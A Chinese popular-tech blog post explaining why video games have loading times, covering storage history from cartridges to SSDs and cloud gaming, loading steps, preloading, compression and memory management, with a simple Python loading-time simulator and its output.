            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2865758605422890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    无限大6
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:45:15.000Z" title="Tue Jan 06 2026 08:45:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🎮 为什么游戏需要"加载时间"？——从硬盘读取到内存渲染 💾</h2>
<blockquote>
<p>大家好，我是无限大，欢迎收看十万个为什么系列文章</p>
<p>希望今天的内容能对大家有所帮助</p>
</blockquote>
<p>想象一下：你迫不及待地打开新买的3A大作，点击"开始游戏"，然后……看着屏幕上的加载圈圈转啊转，转啊转，转了整整一分钟！😫</p>
<p>这时候你可能会想：为什么游戏需要加载？不能一点开就玩吗？</p>
<p>今天咱们就来聊聊游戏"加载时间"背后的秘密！</p>
<h3 data-id="heading-1">🤔 核心问题：游戏加载过程发生了什么？如何减少加载时间？</h3>
<p>很多人觉得"加载"就是"读条"，其实加载是一个<strong>超级复杂的过程</strong>——游戏要把存储在硬盘里的各种"零件"搬运到内存里，然后组装成一个完整的游戏世界！</p>
<h4 data-id="heading-2">游戏加载的"四大件"</h4>
<ul>
<li>🎮 <strong>游戏引擎</strong>：游戏的"大脑"，负责游戏逻辑和渲染</li>
<li>🖼️ <strong>贴图资源</strong>：游戏的"皮肤"，包括角色、场景、物品的纹理</li>
<li>🔊 <strong>音频资源</strong>：游戏的"声音"，包括音乐、语音、音效</li>
<li>📊 <strong>游戏数据</strong>：游戏的"记忆"，包括地图、NPC、AI行为</li>
</ul>
<h4 data-id="heading-3">为什么加载这么慢？</h4>
<ul>
<li>💾 <strong>硬盘速度</strong>：机械硬盘（HDD）读取速度慢，SSD快得多</li>
<li>📦 <strong>资源大小</strong>：现代游戏的资源越来越大（几十GB甚至上百GB）</li>
<li>🔄 <strong>加载顺序</strong>：有些资源必须按顺序加载，不能并行</li>
<li>🧩 <strong>资源依赖</strong>：有些资源需要先加载其他资源才能加载</li>
</ul>
<h3 data-id="heading-4">📜 从"卡带"到"SSD"：游戏加载的进化史</h3>
<h4 data-id="heading-5">1. 🎰 早期卡带时代："小而美"</h4>
<p>1980-1990年代，游戏主要存储在<strong>卡带</strong>里，直接集成在游戏机中。</p>
<p><strong>加载特点</strong>：</p>
<ul>
<li>卡带容量小（通常只有几MB）</li>
<li>游戏数据直接"固化"在硬件中</li>
<li>几乎没有加载时间，一按开机就能玩</li>
<li>受限的图形和声音效果</li>
</ul>
<p><strong>代表游戏</strong>：超级马里奥、魂斗罗、塞尔达传说</p>
<p><strong>技术限制</strong>：</p>
<ul>
<li>卡带容量有限，无法存储高分辨率贴图</li>
<li>只能使用简单的PCM音频，不能播放CD音质音乐</li>
<li>游戏关卡设计受限，需要反复利用同一场景</li>
</ul>
<h4 data-id="heading-6">2. 💿 光盘时代："大而全"</h4>
<p>1990年代-2000年代，游戏进入了<strong>光盘时代</strong>，PS1、PS2、Xbox等主机都使用光盘作为存储介质。</p>
<p><strong>加载特点</strong>：</p>
<ul>
<li>光盘容量大（CD 700MB，DVD 4.7GB）</li>
<li>需要将光盘数据读取到内存</li>
<li>加载时间明显增加（从几秒到几十秒）</li>
<li>出现了"过场加载"（进入新关卡前需要加载）</li>
</ul>
<p><strong>光盘的"痛"</strong>：</p>
<ul>
<li>🔄 读取速度慢（CD-ROM约1-2MB/s，DVD约3-5MB/s）</li>
<li>💿 光盘容易刮花，导致读取错误</li>
<li>🔇 噪音大（光驱转动的声音）</li>
<li>⏱️ 需要经常换盘（多碟游戏）</li>
</ul>
<p><strong>代表游戏</strong>：最终幻想系列、生化危机系列、侠盗猎车手系列</p>
<h4 data-id="heading-7">3. 💾 硬盘时代："持久存储"</h4>
<p>2000年代，随着游戏主机和PC都配备了<strong>硬盘</strong>，游戏加载速度得到了提升。</p>
<p><strong>加载特点</strong>：</p>
<ul>
<li>游戏数据可以安装到硬盘</li>
<li>从硬盘读取比从光盘快得多</li>
<li>支持存档和进度保存</li>
<li>可以进行"碎片整理"优化读取速度</li>
</ul>
<p><strong>硬盘的优势</strong>：</p>
<ul>
<li>🚀 读取速度快（HDD约50-150MB/s）</li>
<li>💾 容量大（早期几十GB，现在几TB）</li>
<li>🔇 静音（没有光驱的噪音）</li>
<li>📦 可靠性高（不易损坏）</li>
</ul>
<p><strong>代表游戏</strong>：使命召唤系列、刺客信条系列、上古卷轴系列</p>
<h4 data-id="heading-8">4. ⚡ SSD时代："飞速加载"</h4>
<p>2010年代，<strong>固态硬盘（SSD）</strong> 开始普及，彻底改变了游戏加载体验！</p>
<p><strong>加载特点</strong>：</p>
<ul>
<li>SSD读取速度是HDD的5-10倍</li>
<li>游戏加载时间大幅缩短</li>
<li>支持"即时"切换场景</li>
<li>出现了"无缝开放世界"</li>
</ul>
<p><strong>SSD的"魔法"</strong>：</p>
<ul>
<li>🚀 读取速度可达500-7000MB/s（NVMe SSD）</li>
<li>⏱️ 随机读取性能极佳（加载小文件快）</li>
<li>🔇 完全静音</li>
<li>📦 体积小、功耗低</li>
</ul>
<p><strong>代表游戏</strong>：最终幻想7重制版、漫威蜘蛛侠、赛博朋克2077</p>
<h4 data-id="heading-9">5. 🔮 云游戏时代："无需下载"</h4>
<p>2020年代，<strong>云游戏</strong>开始兴起，游戏直接在云端运行，流式传输到玩家设备！</p>
<p><strong>加载特点</strong>：</p>
<ul>
<li>无需下载和安装游戏</li>
<li>即点即玩</li>
<li>依赖网络带宽和延迟</li>
<li>游戏运行在云端服务器</li>
</ul>
<p><strong>云游戏的挑战</strong>：</p>
<ul>
<li>📶 需要稳定的网络连接</li>
<li>⏱️ 网络延迟会影响游戏体验</li>
<li>💰 服务器成本高</li>
<li>🎮 画质受网络带宽限制</li>
</ul>
<p><strong>代表平台</strong>：Google Stadia、微软xCloud、 NVIDIA GeForce NOW</p>
<h3 data-id="heading-10">🔧 技术原理：游戏加载的"秘密武器"</h3>
<h4 data-id="heading-11">1. 📦 游戏资源加载流程："搬家记"</h4>
<p>游戏加载就像<strong>从仓库往新家搬东西</strong>，需要经历以下几个步骤：</p>
<p><strong>步骤1：读取存储介质</strong></p>
<ul>
<li>从硬盘/光盘/网络读取游戏数据</li>
<li>不同的存储介质，读取速度差异巨大</li>
<li>数据读取后会被临时存放在"内存缓冲区"</li>
</ul>
<p><strong>步骤2：数据解压</strong></p>
<ul>
<li>游戏资源通常会被压缩存储（节省空间）</li>
<li>加载时需要解压（消耗CPU资源）</li>
<li>常见的压缩格式：ZIP、RAR、LZ4、ZSTD</li>
</ul>
<p><strong>步骤3：资源解析</strong></p>
<ul>
<li>将原始数据转换为游戏可以使用的格式</li>
<li>贴图数据转换为GPU纹理</li>
<li>模型数据转换为顶点缓冲</li>
<li>音频数据转换为采样缓冲</li>
</ul>
<p><strong>步骤4：资源上传GPU</strong></p>
<ul>
<li>将解析后的资源上传到显存</li>
<li>这是加载过程中最耗时的步骤之一</li>
<li>PCI Express 4.0/5.0大幅提升了传输速度</li>
</ul>
<p><strong>步骤5：初始化游戏对象</strong></p>
<ul>
<li>根据加载的资源创建游戏对象</li>
<li>初始化场景、角色、NPC</li>
<li>建立对象之间的关联关系</li>
</ul>
<h4 data-id="heading-12">2. 🎯 预加载技术："未雨绸缪"</h4>
<p>聪明的游戏开发者会使用<strong>预加载技术</strong>，提前加载可能需要的资源，减少游戏过程中的等待！</p>
<p><strong>按需预加载</strong></p>
<ul>
<li>根据玩家行为预测下一步操作</li>
<li>提前加载相关资源</li>
<li>比如：玩家靠近门口时，提前加载门后的场景</li>
</ul>
<p><strong>后台预加载</strong></p>
<ul>
<li>利用游戏运行时的"空闲时间"加载资源</li>
<li>比如：过场动画播放时，后台加载下一场景</li>
<li>玩家几乎感觉不到加载过程</li>
</ul>
<p><strong>层级化加载</strong></p>
<ul>
<li>将资源分为多个优先级</li>
<li>高优先级资源先加载（保证游戏可玩性）</li>
<li>低优先级资源后加载（优化体验）</li>
</ul>
<p><strong>异步加载</strong></p>
<ul>
<li>不阻塞游戏主线程</li>
<li>加载过程在后台进行</li>
<li>玩家可以继续进行游戏操作</li>
</ul>
<h4 data-id="heading-13">3. 🗜️ 资源压缩技术："空间换时间"</h4>
<p>游戏资源通常很大，需要通过<strong>压缩技术</strong>来节省存储空间！</p>
<p><strong>常见的游戏资源压缩格式</strong></p>









































<table><thead><tr><th>压缩格式</th><th>适用资源</th><th>压缩率</th><th>解压速度</th></tr></thead><tbody><tr><td>ZIP</td><td>通用压缩</td><td>中等</td><td>快</td></tr><tr><td>LZ4</td><td>贴图、模型</td><td>中等</td><td>很快</td></tr><tr><td>ZSTD</td><td>贴图、模型</td><td>高</td><td>快</td></tr><tr><td>Oodle</td><td>贴图、模型</td><td>很高</td><td>很快</td></tr><tr><td>BC</td><td>GPU纹理</td><td>无损</td><td>极快</td></tr></tbody></table>
<p><strong>纹理压缩格式</strong>（专门针对GPU优化）</p>
<ul>
<li><strong>DXT/BC</strong>：DirectX纹理压缩</li>
<li><strong>ETC</strong>：爱立信纹理压缩（移动端）</li>
<li><strong>ASTC</strong>：自适应可扩展纹理压缩（移动端）</li>
</ul>
<p><strong>音频压缩格式</strong></p>
<ul>
<li><strong>MP3</strong>：有损压缩，文件小</li>
<li><strong>AAC</strong>：高级音频编码，苹果常用</li>
<li><strong>WAV</strong>：无损格式，文件大</li>
<li><strong>OGG</strong>：开源音频格式</li>
</ul>
<h4 data-id="heading-14">4. 🧠 内存管理技术："精打细算"</h4>
<p>游戏内存是有限的，需要<strong>精细的内存管理</strong>！</p>
<p><strong>资源池技术</strong></p>
<ul>
<li>预先分配一块内存池</li>
<li>重复利用已释放的资源</li>
<li>减少内存分配和释放的开销</li>
</ul>
<p><strong>资源引用计数</strong></p>
<ul>
<li>记录每个资源被引用的次数</li>
<li>引用计数为0时，可以安全释放</li>
<li>防止内存泄漏</li>
</ul>
<p><strong>分页和换出</strong></p>
<ul>
<li>将不常用的资源换出到硬盘</li>
<li>需要时再换入内存</li>
<li>类似于操作系统的虚拟内存</li>
</ul>
<p><strong>内存池碎片整理</strong></p>
<ul>
<li>定期整理内存池</li>
<li>合并空闲内存块</li>
<li>防止内存碎片化</li>
</ul>
<h3 data-id="heading-15">💻 代码实例：游戏加载模拟器</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Optional</span>
<span class="hljs-keyword">import</span> os

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">GameResource</span>:
    <span class="hljs-string">"""游戏资源"""</span>
    name: <span class="hljs-built_in">str</span>           <span class="hljs-comment"># 资源名称</span>
    size_mb: <span class="hljs-built_in">float</span>      <span class="hljs-comment"># 资源大小</span>
    load_time: <span class="hljs-built_in">float</span>    <span class="hljs-comment"># 加载时间</span>
    resource_type: <span class="hljs-built_in">str</span>  <span class="hljs-comment"># 资源类型</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">StorageDevice</span>:
    <span class="hljs-string">"""存储设备"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span>, read_speed_mbps: <span class="hljs-built_in">float</span>, name_emoji: <span class="hljs-built_in">str</span> = <span class="hljs-string">"💾"</span></span>):
        self.name = name
        self.read_speed = read_speed_mbps
        self.name_emoji = name_emoji
  
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_load_time</span>(<span class="hljs-params">self, file_size_mb: <span class="hljs-built_in">float</span></span>) -&gt; <span class="hljs-built_in">float</span>:
        <span class="hljs-string">"""计算加载时间（秒）"""</span>
        <span class="hljs-keyword">return</span> file_size_mb / self.read_speed

<span class="hljs-keyword">class</span> <span class="hljs-title class_">GameLoader</span>:
    <span class="hljs-string">"""游戏加载器"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, storage: StorageDevice</span>):
        self.storage = storage
        self.loaded_resources: <span class="hljs-type">List</span>[GameResource] = []
  
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_resource</span>(<span class="hljs-params">self, resource: GameResource, show_progress: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
        <span class="hljs-string">"""加载单个资源"""</span>
        <span class="hljs-keyword">if</span> show_progress:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"📦 正在加载 <span class="hljs-subst">{resource.name}</span>..."</span>)
      
        <span class="hljs-comment"># 模拟加载时间</span>
        load_time = self.storage.calculate_load_time(resource.size_mb)
        time.sleep(load_time * <span class="hljs-number">0.5</span>)  <span class="hljs-comment"># 加速模拟</span>
      
        self.loaded_resources.append(resource)
      
        <span class="hljs-keyword">if</span> show_progress:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✅ <span class="hljs-subst">{resource.name}</span> 加载完成！耗时: <span class="hljs-subst">{load_time:<span class="hljs-number">.2</span>f}</span>秒"</span>)
      
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
  
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_game_resources</span>(<span class="hljs-params">self, resources: <span class="hljs-type">List</span>[GameResource]</span>) -&gt; <span class="hljs-built_in">float</span>:
        <span class="hljs-string">"""加载所有游戏资源"""</span>
        total_time = <span class="hljs-number">0</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n🎮 开始加载游戏资源..."</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"📀 使用存储设备: <span class="hljs-subst">{self.storage.name_emoji}</span> <span class="hljs-subst">{self.storage.name}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🚀 读取速度: <span class="hljs-subst">{self.storage.read_speed}</span> MB/s"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">50</span>)
      
        <span class="hljs-keyword">for</span> i, resource <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(resources, <span class="hljs-number">1</span>):
            self.load_resource(resource, show_progress=<span class="hljs-literal">True</span>)
            total_time += resource.size_mb / self.storage.read_speed
      
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">50</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🎉 游戏加载完成！"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"📊 总资源数量: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(resources)}</span> 个"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"📦 总资源大小: <span class="hljs-subst">{<span class="hljs-built_in">sum</span>(r.size_mb <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> resources):<span class="hljs-number">.2</span>f}</span> MB"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"⏱️ 总加载时间: <span class="hljs-subst">{total_time:<span class="hljs-number">.2</span>f}</span> 秒"</span>)
      
        <span class="hljs-keyword">return</span> total_time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">simulate_loading_comparison</span>():
    <span class="hljs-string">"""模拟不同存储设备的加载对比"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span>*<span class="hljs-number">60</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"📊 游戏加载时间对比"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">60</span>)
  
    <span class="hljs-comment"># 模拟的游戏资源</span>
    game_resources = [
        GameResource(<span class="hljs-string">"游戏引擎核心"</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🔧"</span>),
        GameResource(<span class="hljs-string">"主场景地图"</span>, <span class="hljs-number">200</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🗺️"</span>),
        GameResource(<span class="hljs-string">"角色模型"</span>, <span class="hljs-number">150</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"👤"</span>),
        GameResource(<span class="hljs-string">"高分辨率贴图"</span>, <span class="hljs-number">300</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🖼️"</span>),
        GameResource(<span class="hljs-string">"背景音乐"</span>, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🎵"</span>),
        GameResource(<span class="hljs-string">"音效文件"</span>, <span class="hljs-number">80</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🔊"</span>),
        GameResource(<span class="hljs-string">"NPC AI数据"</span>, <span class="hljs-number">30</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🤖"</span>),
        GameResource(<span class="hljs-string">"过场动画"</span>, <span class="hljs-number">250</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🎬"</span>),
        GameResource(<span class="hljs-string">"UI界面"</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"📱"</span>),
        GameResource(<span class="hljs-string">"粒子特效"</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"✨"</span>),
    ]
  
    <span class="hljs-comment"># 不同的存储设备</span>
    devices = [
        StorageDevice(<span class="hljs-string">"机械硬盘 (HDD)"</span>, <span class="hljs-number">100</span>, <span class="hljs-string">"💿"</span>),
        StorageDevice(<span class="hljs-string">"SATA SSD"</span>, <span class="hljs-number">500</span>, <span class="hljs-string">"💾"</span>),
        StorageDevice(<span class="hljs-string">"NVMe SSD"</span>, <span class="hljs-number">3500</span>, <span class="hljs-string">"⚡"</span>),
    ]
  
    results = []
    <span class="hljs-keyword">for</span> device <span class="hljs-keyword">in</span> devices:
        loader = GameLoader(device)
        total_time = loader.load_game_resources(game_resources)
        results.append((device.name, total_time))
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span>)
  
    <span class="hljs-comment"># 对比结果</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">60</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"📈 加载时间对比结果"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">60</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-string">'存储设备'</span>:&lt;<span class="hljs-number">20</span>}</span> <span class="hljs-subst">{<span class="hljs-string">'加载时间'</span>:&lt;<span class="hljs-number">15</span>}</span> <span class="hljs-subst">{<span class="hljs-string">'体验评价'</span>}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">60</span>)
  
    device_names = {
        <span class="hljs-string">"机械硬盘 (HDD)"</span>: <span class="hljs-string">"😴 漫长等待"</span>,
        <span class="hljs-string">"SATA SSD"</span>: <span class="hljs-string">"😊 还算流畅"</span>,
        <span class="hljs-string">"NVMe SSD"</span>: <span class="hljs-string">"🚀 飞一般的感觉"</span>,
    }
  
    <span class="hljs-keyword">for</span> device_name, time_taken <span class="hljs-keyword">in</span> results:
        emoji = device_names.get(device_name, <span class="hljs-string">"🤔"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{device_name:&lt;<span class="hljs-number">20</span>}</span> <span class="hljs-subst">{time_taken:&gt;<span class="hljs-number">10.2</span>f}</span> 秒    <span class="hljs-subst">{emoji}</span>"</span>)
  
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n💡 小贴士：升级到SSD，游戏加载速度提升 5-35 倍！"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"🎮 欢迎使用游戏加载模拟器！"</span>)
    simulate_loading_comparison()
</code></pre>
<p><strong>运行结果</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">🎮 欢迎使用游戏加载模拟器！

============================================================
<span class="hljs-section">📊 游戏加载时间对比
============================================================</span>

🎮 开始加载游戏资源...
📀 使用存储设备: 💿 机械硬盘 (HDD)
<span class="hljs-section">🚀 读取速度: 100 MB/s
--------------------------------------------------</span>
📦 正在加载 游戏引擎核心...
✅ 游戏引擎核心 加载完成！耗时: 0.50秒
📦 正在加载 主场景地图...
✅ 主场景地图 加载完成！耗时: 2.00秒
...（省略部分输出）...
🎉 游戏加载完成！
📊 总资源数量: 10 个
📦 总资源大小: 1250.00 MB
⏱️ 总加载时间: 12.50 秒

<span class="hljs-section">📊 加载时间对比结果
============================================================</span>
<span class="hljs-section">📈 加载时间对比结果
============================================================</span>
<span class="hljs-section">存储设备              加载时间          体验评价
------------------------------------------------------------</span>
机械硬盘 (HDD)        12.50 秒     😴 漫长等待
SATA SSD              2.50 秒      😊 还算流畅
NVMe SSD              0.36 秒      🚀 飞一般的感觉
</code></pre>
<h3 data-id="heading-16">📊 趣味对比：HDD vs SSD vs 其他存储设备</h3>











































































